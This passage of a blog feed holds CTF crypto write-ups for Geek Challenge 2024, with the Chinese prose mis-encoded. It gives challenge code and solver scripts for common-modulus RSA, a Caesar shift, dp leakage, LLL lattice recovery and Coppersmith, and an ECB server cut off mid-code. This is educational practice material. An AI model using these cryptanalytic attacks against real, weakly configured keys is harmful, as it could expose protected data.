l <span class="hljs-keyword">in</span> L:<br>    f = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> l[:-<span class="hljs-number">1</span>]:<br>        <span class="hljs-keyword">if</span> i != <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> i !=-<span class="hljs-number">1</span>:<br>            f = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span> f==<span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(l)<br>        r = <span class="hljs-built_in">list</span>(l[:-<span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">break</span><br>e_bin = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(r)):<br>    <span class="hljs-keyword">if</span> r[i] == -<span class="hljs-number">1</span>:<br>        e_bin = e_bin + <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-comment">#è§‚å¯Ÿé¦–ä½æ˜¯1è¿˜æ˜¯-1ï¼Œç”±äºè¦ä¿è¯eçš„ä½æ•°ï¼Œå› æ­¤é¦–ä½æ˜¯ä»€ä¹ˆï¼Œä»€ä¹ˆå°±æ˜¯1</span><br>    <span class="hljs-keyword">elif</span> r[i] == <span class="hljs-number">1</span> :<br>        e_bin = e_bin + <span class="hljs-string">&#x27;0&#x27;</span><br>e = <span class="hljs-built_in">int</span>(e_bin, <span class="hljs-number">2</span>)<br><span class="hljs-built_in">print</span>(e)<br><br><span class="hljs-comment">#coppersmithæ±‚p_low</span><br>pbits=<span class="hljs-number">1024</span><br>kbits=<span class="hljs-number">435</span><br><br>R.&lt;x&gt; = PolynomialRing(Zmod(n))<br>f = p_high + x <br>roots = f.small_roots(X=<span class="hljs-number">2</span>^kbits,beta=<span class="hljs-number">0.4</span>)<br><br>p = p_high + <span class="hljs-built_in">int</span>(roots[<span class="hljs-number">0</span>])<br>q = n // p<br>phi = (p-<span class="hljs-number">1</span>) * (q-<span class="hljs-number">1</span>)<br>d = inverse(e,phi)<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br>ans= long_to_bytes(m)<br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æå®¢å¤§æŒ‘æˆ˜ 2024 Cryptoå¤ç°</title>
    <link href="/2025/07/23/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202024%20Crypto%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/07/23/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202024%20Crypto%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>æœ¬æ–‡æ˜¯å…³äºæå®¢å¤§æŒ‘æˆ˜2024 Cryptoæ–¹å‘çš„éƒ¨åˆ†é¢˜ç›®å¤ç°ï¼Œæœ¬æ¬¡å¤ç°ä¸»è¦ç›®çš„æ˜¯åˆ·é¢˜ï¼Œå› æ­¤å¹¶æ²¡æœ‰å†™è¯¦ç»†çš„è§£é¢˜æ­¥éª¤ï¼Œæ€»ç»“æ¥è¯´ï¼Œè¿™ä¸ªæ¯”èµ›çš„é¢˜ç›®éš¾åº¦éƒ½ä¸æ˜¯å¾ˆå¤§ï¼Œè¦†ç›–é¢è¾ƒå¹¿ï¼Œé€‚åˆæ–°æ‰‹ç»ƒä¹ (<em>ï¾Ÿâˆ€ï¾Ÿ</em>)</p><h1 id="å…±æ¨¡æ”»å‡»"><a href="#å…±æ¨¡æ”»å‡»" class="headerlink" title="å…±æ¨¡æ”»å‡»"></a>å…±æ¨¡æ”»å‡»</h1><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br>p,q = [getPrime(<span class="hljs-number">1024</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>)] <br>n = p*q<br>e = [getPrime(<span class="hljs-number">10</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>)]<br><br>m = bytes_to_long(flag)<br><br>c = [<span class="hljs-built_in">pow</span>(m, e[i], n) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>)]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;n = <span class="hljs-subst">&#123;n&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;e1 = <span class="hljs-subst">&#123;e[<span class="hljs-number">0</span>]&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;e2 = <span class="hljs-subst">&#123;e[<span class="hljs-number">1</span>]&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c1 = <span class="hljs-subst">&#123;c[<span class="hljs-number">0</span>]&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c2 = <span class="hljs-subst">&#123;c[<span class="hljs-number">1</span>]&#125;</span>&#x27;</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n = 19742875423645690846073637620470497648804310111201409901059297083827103813674034450200432098143959078292346910591785265323563248781526393718834491458926162514713269984791730816121181307827624489725923763353393879316510062227511469438742429290073999388690825732236465647396755899136346150862848924231619666069528077790933176798057396704758072769660663756346237040909579775389576227450505746914753205890194457812893098491264392293949768193694560954874603451253079446652049592976605414438411872223250039782381259212718733455588477129910357095186014496957765297934289263536712574572533650393220492870445376144568199077767</span><br><span class="hljs-string">e1 = 911</span><br><span class="hljs-string">e2 = 967</span><br><span class="hljs-string">c1 = 18676091924461946809127036439355116782539894105245796626898495935702348484076501694838877829307466429933623102626122909782775514926293363853121828819237500456062111805212209491398720528499589486241208820804465599279152640624618194425740368495072591471531868392274503936869225072123214869399971636428177516761675388589238329574042518038702529606188240859751459632643230538522947412931990009143731829484941397093509641320264169403755707495153433568106934850283614529793695266717330769019091782929139589939928210818515744604847453929432990185347112319971445630830477574679898503825626294542336195240055995445217249602983</span><br><span class="hljs-string">c2 = 4229417863231092939788858229435938841085459330992709019823280977891432565586698228613770964563920779991584732527715378842621171338649745186081520176123907689669636473919678398014317024138622949923292787095400632018991311254591786179660603414693984024161009444842277220189315861986306573182865656366278782315864366857374874763243428496061153290565891942968876789905670073321426112497113145141539289020571684634406829272902118484670099097148727072718299512735637087933649345419433312872607209633402427461708181971718804026293074540519907755129917132236240606834816534369171888633588190859475764799895410284484045429152</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>n = <span class="hljs-number">19742875423645690846073637620470497648804310111201409901059297083827103813674034450200432098143959078292346910591785265323563248781526393718834491458926162514713269984791730816121181307827624489725923763353393879316510062227511469438742429290073999388690825732236465647396755899136346150862848924231619666069528077790933176798057396704758072769660663756346237040909579775389576227450505746914753205890194457812893098491264392293949768193694560954874603451253079446652049592976605414438411872223250039782381259212718733455588477129910357095186014496957765297934289263536712574572533650393220492870445376144568199077767</span><br>e1 = <span class="hljs-number">911</span><br>e2 = <span class="hljs-number">967</span><br>c1 = <span class="hljs-number">18676091924461946809127036439355116782539894105245796626898495935702348484076501694838877829307466429933623102626122909782775514926293363853121828819237500456062111805212209491398720528499589486241208820804465599279152640624618194425740368495072591471531868392274503936869225072123214869399971636428177516761675388589238329574042518038702529606188240859751459632643230538522947412931990009143731829484941397093509641320264169403755707495153433568106934850283614529793695266717330769019091782929139589939928210818515744604847453929432990185347112319971445630830477574679898503825626294542336195240055995445217249602983</span><br>c2 = <span class="hljs-number">4229417863231092939788858229435938841085459330992709019823280977891432565586698228613770964563920779991584732527715378842621171338649745186081520176123907689669636473919678398014317024138622949923292787095400632018991311254591786179660603414693984024161009444842277220189315861986306573182865656366278782315864366857374874763243428496061153290565891942968876789905670073321426112497113145141539289020571684634406829272902118484670099097148727072718299512735637087933649345419433312872607209633402427461708181971718804026293074540519907755129917132236240606834816534369171888633588190859475764799895410284484045429152</span><br><br>_ , p1, q1 = gmpy2.gcdext(e1, e2)<br>m = (<span class="hljs-built_in">pow</span>(c1, p1, n) * <span class="hljs-built_in">pow</span>(c2, q1, n)) % n<br>ans = long_to_bytes(m)<br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h1 id="å‡¯æ’’åŠ å¯†"><a href="#å‡¯æ’’åŠ å¯†" class="headerlink" title="å‡¯æ’’åŠ å¯†"></a>å‡¯æ’’åŠ å¯†</h1><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">YEI&#123;CKRIUSK_ZU_2024_MKKQ_INGRRKTMK&#125;<br></code></pre></td></tr></table></figure><p><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;Caesar.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>strings = file.read()<br>ans = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> strings:<br>    <span class="hljs-keyword">if</span> i.isalpha() == <span class="hljs-literal">False</span>:<br>        ans += i<br>        <span class="hljs-keyword">continue</span><br>    ans += <span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(i)-<span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;A&quot;</span>)-<span class="hljs-number">6</span>)%<span class="hljs-number">26</span>+<span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;A&quot;</span>))<br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h1 id="dp"><a href="#dp" class="headerlink" title="dp"></a>dp</h1><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime,bytes_to_long<br><br>p,q = getPrime(<span class="hljs-number">512</span>),getPrime(<span class="hljs-number">512</span>)<br>n = p * q<br>e = <span class="hljs-number">65537</span><br>d = <span class="hljs-built_in">pow</span>(e,-<span class="hljs-number">1</span>,(p-<span class="hljs-number">1</span>) * (q-<span class="hljs-number">1</span>))<br>dp = d % (p-<span class="hljs-number">1</span>)<br>m = bytes_to_long(flag) <span class="hljs-comment">#type:ignore</span><br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c = &quot;</span>,c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n = &quot;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e = &quot;</span>,e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;dp = &quot;</span>,dp)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">c =  127916287434936224964530288403657504450134210781148845328357237956681373722556447001247137686758965891751380034827824922625307521221598031789165449134994998397717982461775225812413476283147124013667777578827293691666320739053915493782515447112364470583788127477537555786778672970196314874316507098162498135060</span><br><span class="hljs-string">n =  157667866005866043809675592336288962106125998780791920007920833145068421861029354497045918471672956655205541928071253023208751202980457919399456984628429198438149779785543371372206661553180051432786094530268099696823142821724314197245158942206348670703497441629288741715352106143317909146546420870645633338871</span><br><span class="hljs-string">e =  65537</span><br><span class="hljs-string">dp =  2509050304161548479367108202753097217949816106531036020623500808413533337006939302155166063392071003278307018323129989037561756887882853296553118973548769</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> inverse,long_to_bytes<br>c =  <span class="hljs-number">127916287434936224964530288403657504450134210781148845328357237956681373722556447001247137686758965891751380034827824922625307521221598031789165449134994998397717982461775225812413476283147124013667777578827293691666320739053915493782515447112364470583788127477537555786778672970196314874316507098162498135060</span><br>n =  <span class="hljs-number">157667866005866043809675592336288962106125998780791920007920833145068421861029354497045918471672956655205541928071253023208751202980457919399456984628429198438149779785543371372206661553180051432786094530268099696823142821724314197245158942206348670703497441629288741715352106143317909146546420870645633338871</span><br>e =  <span class="hljs-number">65537</span><br>dp =  <span class="hljs-number">2509050304161548479367108202753097217949816106531036020623500808413533337006939302155166063392071003278307018323129989037561756887882853296553118973548769</span><br><br>x = e*dp - <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,e):<br>    <span class="hljs-keyword">if</span> x % i == <span class="hljs-number">0</span>:<br>        p_1 = x // i + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> n % p_1 == <span class="hljs-number">0</span>:<br>            p = p_1<br>            q = n // p<br>            <span class="hljs-keyword">break</span><br>phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>d = inverse(e, phi)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br>ans = long_to_bytes(m)<br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h1 id="easy-LLL"><a href="#easy-LLL" class="headerlink" title="easy LLL"></a>easy LLL</h1><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>m = bytes_to_long(flag)<br>p = getPrime(<span class="hljs-number">1024</span>)<br><span class="hljs-keyword">assert</span> m.bit_length() ==  <span class="hljs-number">255</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">m</span>):<br>    a = getPrime(<span class="hljs-number">1024</span>)<br>    b = getPrime(<span class="hljs-number">400</span>)<br>    c = (a * m + b) % p<br>    <span class="hljs-keyword">return</span> c, a<br><br>result = [encrypt(m) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>)]<br>c = [x[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> result]<br>a = [x[<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> result]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;p =&#x27;</span>, p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c =&#x27;</span>, c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;a =&#x27;</span>, a)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">p = 114770017142688382362918268558878024848633097928402093647914503696492833723966801545716194546592346338592062332306371502256979159033965343002132956304625610134374822329402499359634555710129039614275145668904822690744696925414716152630310915301980153974374009140517084226870950134327432658087834138202887501571</span><br><span class="hljs-string">c = [25269157674120082500323585451842928560404625967932662908517922704871828513397233858615005968124017428639853960550468542894270451871612496631645175015826203493265945456529848647562285359912541672751550625137876486033809099678631009005979648033707322772087110235116987698692692467320479776960630479772236446980, 75827517416784647262997004080634347924631190865715212882627791181841845414253117114184423517850773219376565782814219713490136873921446382123059696483594598328510450811390866671002685611755205236016843942407419858592870716928648777362367108239158432436307113173823883182666320180058177554647020175991566479974, 4000439731719746534404360339840675006453847582492745979982221624660296805996044239209286181541462187650487112017410839740281883027081539802479046385802021188067656190594734619927933032154534742175380783895559841318520045144113562164247717915766667365412215754183668349398802684299015216478025166881475794536, 16711257143606850336586355581909703391105580636095435863487225535083010317005439435375105800641024112138121810242207127443011036209544967633123983636015153089843815287370646565071784002098183021489882046492609441708361550786752857773565252821037805549119284258373739189052221307754872723967188683410620808193, 106512227999048988543537542345636528925594107128125030635002665980574709006558840446189017357623681828677935125012144689963798865971782914704616798239451971370511961281779438306334353650663495164449411037055054859128957955413918744183200858441122917851347996800797164614883188302584586112732819164555910532500]</span><br><span class="hljs-string">a = [177876163920838720585474640511391249051418827853372387342635245341495792468826199544624082182728094652999191797576747605771062756630817438777653951772485569478516324903956113309190795622258346824643390004835397272889256696087356239515881459115499360779486974615331766141255410923960657795391638070660994726539, 154147211832384364492785997490497428696214843927503185938896425556028644075902949520267734189423717477702286854849502563505554965833703544305651488482204719931055591825164774932532116940955079750398001376723036214113076925445019856194390932639722726924707396244454184674407094860919513514591518499956074524561, 162236910312416448303316079284626131452444352290110477620135842885125003493068172330766174225997049094080836685617836911475638508283918576304502582848847097467251286819613975600023439985149604495163647781268904127545271241114039490048103188362740808427663167350820948490766499995036870926879430699822216419877, 156324330649465856865205652642919116551480610060830456323361514761783406613162826555066367215822747145109223530381689780625035795004458919262362420375225560790467893332585836287433463308447660726674632677063603419250881619682710122472587150879771212601074942044613408069114640355658551759306352327418458216623, 94727349364308455432706991721504607810501329870619614073375570944298709074650444442139356318854809081925625009516102978518170343525726627149123655332253529418292440747073463615106501530133930750010290051226765906194210372904323460884238665194406125116885468971886527174150462509520345910607640580833401931201]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>p = <span class="hljs-number">114770017142688382362918268558878024848633097928402093647914503696492833723966801545716194546592346338592062332306371502256979159033965343002132956304625610134374822329402499359634555710129039614275145668904822690744696925414716152630310915301980153974374009140517084226870950134327432658087834138202887501571</span><br>c = [<span class="hljs-number">25269157674120082500323585451842928560404625967932662908517922704871828513397233858615005968124017428639853960550468542894270451871612496631645175015826203493265945456529848647562285359912541672751550625137876486033809099678631009005979648033707322772087110235116987698692692467320479776960630479772236446980</span>, <span class="hljs-number">75827517416784647262997004080634347924631190865715212882627791181841845414253117114184423517850773219376565782814219713490136873921446382123059696483594598328510450811390866671002685611755205236016843942407419858592870716928648777362367108239158432436307113173823883182666320180058177554647020175991566479974</span>, <span class="hljs-number">4000439731719746534404360339840675006453847582492745979982221624660296805996044239209286181541462187650487112017410839740281883027081539802479046385802021188067656190594734619927933032154534742175380783895559841318520045144113562164247717915766667365412215754183668349398802684299015216478025166881475794536</span>, <span class="hljs-number">16711257143606850336586355581909703391105580636095435863487225535083010317005439435375105800641024112138121810242207127443011036209544967633123983636015153089843815287370646565071784002098183021489882046492609441708361550786752857773565252821037805549119284258373739189052221307754872723967188683410620808193</span>, <span class="hljs-number">106512227999048988543537542345636528925594107128125030635002665980574709006558840446189017357623681828677935125012144689963798865971782914704616798239451971370511961281779438306334353650663495164449411037055054859128957955413918744183200858441122917851347996800797164614883188302584586112732819164555910532500</span>]<br>a = [<span class="hljs-number">177876163920838720585474640511391249051418827853372387342635245341495792468826199544624082182728094652999191797576747605771062756630817438777653951772485569478516324903956113309190795622258346824643390004835397272889256696087356239515881459115499360779486974615331766141255410923960657795391638070660994726539</span>, <span class="hljs-number">154147211832384364492785997490497428696214843927503185938896425556028644075902949520267734189423717477702286854849502563505554965833703544305651488482204719931055591825164774932532116940955079750398001376723036214113076925445019856194390932639722726924707396244454184674407094860919513514591518499956074524561</span>, <span class="hljs-number">162236910312416448303316079284626131452444352290110477620135842885125003493068172330766174225997049094080836685617836911475638508283918576304502582848847097467251286819613975600023439985149604495163647781268904127545271241114039490048103188362740808427663167350820948490766499995036870926879430699822216419877</span>, <span class="hljs-number">156324330649465856865205652642919116551480610060830456323361514761783406613162826555066367215822747145109223530381689780625035795004458919262362420375225560790467893332585836287433463308447660726674632677063603419250881619682710122472587150879771212601074942044613408069114640355658551759306352327418458216623</span>, <span class="hljs-number">94727349364308455432706991721504607810501329870619614073375570944298709074650444442139356318854809081925625009516102978518170343525726627149123655332253529418292440747073463615106501530133930750010290051226765906194210372904323460884238665194406125116885468971886527174150462509520345910607640580833401931201</span>]<br><br><br>M = matrix(ZZ,<span class="hljs-number">7</span>,<span class="hljs-number">7</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    M[i,i] = p<br>    M[-<span class="hljs-number">2</span>,i] = a[i]<br>    M[-<span class="hljs-number">1</span>,i] = c[i]<br>M[-<span class="hljs-number">2</span>,-<span class="hljs-number">2</span>] = <span class="hljs-number">1</span><br>M[-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>] = <span class="hljs-number">1</span><br>L = M.LLL()[<span class="hljs-number">0</span>]<br><span class="hljs-keyword">if</span> L:<br>    <span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">abs</span>(L[-<span class="hljs-number">2</span>])%p))<br></code></pre></td></tr></table></figure><h1 id="ECBpad"><a href="#ECBpad" class="headerlink" title="ECBpad"></a>ECBpad</h1><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socketserver<br><span class="hljs-keyword">import</span> signal<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><br>KEY = <span class="hljs-string">b&#x27;...&#x27;</span><br>FLAG = <span class="hljs-string">b&#x27;SYC&#123;...&#125;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">key, plaintext</span>):<br>        plaintext = padding(plaintext)<br>        cipher = AES.new(key, AES.MODE_ECB)<br>        <span class="hljs-keyword">return</span> cipher.encrypt(plaintext)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">padding</span>(<span class="hljs-params">m</span>):<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">len</span>(m) % <span class="hljs-number">16</span> != <span class="hljs-number">0</span>):<br>        m = m + <span class="hljs-string">b&#x27;F&#x27;</span> * (<span class="hljs-number">16</span> - (<span class="hljs-built_in">len</span>(m) % <span class="hljs-number">16</span>))<br>    <span class="hljs-keyword">return</span> m<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Serve</span>(socketserver.BaseRequestHandler):<br><br>    ctry = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_recvall</span>(<span class="hljs-params">self</span>):<br>        BUFF_SIZE = <span class="hljs-number">2048</span><br>        data = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            part = <span class="hljs-variable language_">self</span>.request.recv(BUFF_SIZE)<br>            data += part<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(part) &lt; BUFF_SIZE:<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">return</span> data.strip()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">self, msg, newline=<span class="hljs-literal">True</span></span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> newline:<br>                msg += <span class="hljs-string">b&#x27;\n&#x27;</span><br>            <span class="hljs-variable language_">self</span>.request.sendall(msg)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br>        <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">recv</span>(<span class="hljs-params">self, prompt=<span class="hljs-string">b&#x27;[-] &#x27;</span></span>):<br>        <span class="hljs-variable language_">self</span>.send(prompt, newline=<span class="hljs-literal">False</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>._recvall()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">try</span>:<br>            go = <span class="hljs-number">1</span><br>            signal.alarm(<span class="hljs-number">3000</span>)<br>            <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;Welcome to the AES_ECB Cryptography System&#x27;</span>)<br>            <span class="hljs-variable 